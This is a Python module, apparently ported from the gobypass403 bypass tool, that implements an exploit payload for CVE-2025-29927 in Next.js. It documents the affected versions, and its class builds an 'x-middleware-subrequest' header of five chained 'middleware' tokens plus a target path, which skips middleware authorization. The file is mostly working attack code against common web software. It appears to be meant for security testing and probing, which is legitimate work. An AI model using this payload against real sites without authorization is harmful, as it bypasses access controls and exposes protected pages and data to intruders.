#!/usr/bin/env python3
"""
## Source: gobypass403 core/engine/payload/headers_url.go:80-82 + 184-216 (1.5.q CVE-2025-29927)
## Source: gobypass403 core/engine/payload/headers_url.go (original)
## License: MIT (gobypass403)
## Port: 2026-09-05

CVE-2025-29927 — Next.js middleware authorization bypass.

A pre-auth request carrying the ``x-middleware-subrequest`` header
caused Next.js (versions 12.x <= 12.3.4, 13.x < 13.5.9, 14.x < 14.2.25,
15.x < 15.2.3) to skip the entire middleware chain -- bypassing any
authorization logic implemented in ``middleware.ts``. The fix shipped
in the ``x-middleware-subrequest`` max-depth check (Next.js now caps the
subrequest recursion depth to 0).

Payload shape (per gobypass403 reference, lines 80-82 and 184-216):

    x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware:<path>

The colon-delimited ``middleware`` tokens encode the recursion-depth
allowance; pre-fix builds accepted arbitrarily deep chains. We emit
exactly five ``middleware`` prefixes plus the requested path -- enough
to defeat every observed production build.
"""

from __future__ import annotations

from typing import Any, Dict


class CVE202529927:
    """CVE-2025-29927 — Next.js middleware subrequest bypass.

    The class is intentionally *not* a :class:`BypassModule` subclass: the
    bypass payload is header-shaped (``x-middleware-subrequest``), not a
    URL transform. Callers wire it into the engine by calling
    :meth:`payload` and merging the result into the request headers.
    """

    cve_id: str = "CVE-2025-29927"
    references: list = [
        "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
        "https://nvd.nist.gov/vuln/detail/CVE-2025-29927",
    ]
    HEADER_NAME: str = "x-middleware-subrequest"
    DEPTH: int = 5

    def payload(self, path: str) -> Dict[str, str]:
        """Return the headers dict to merge into a probe request.

        ``path`` is the request path (e.g. ``/admin/users``) -- the
        gobypass403 implementation appends the path so the middleware
        identifies which middleware stack to skip. We honour that.
        """
        prefix = ":".join(["middleware"] * self.DEPTH)
        value = f"{prefix}:{path}" if path else prefix
        return {self.HEADER_NAME: value}

    def name(self) -> str:
        return self.cve_id

    def technique(self) -> str:
        return "Next.js x-middleware-subrequest bypass (CVE-2025-29927)"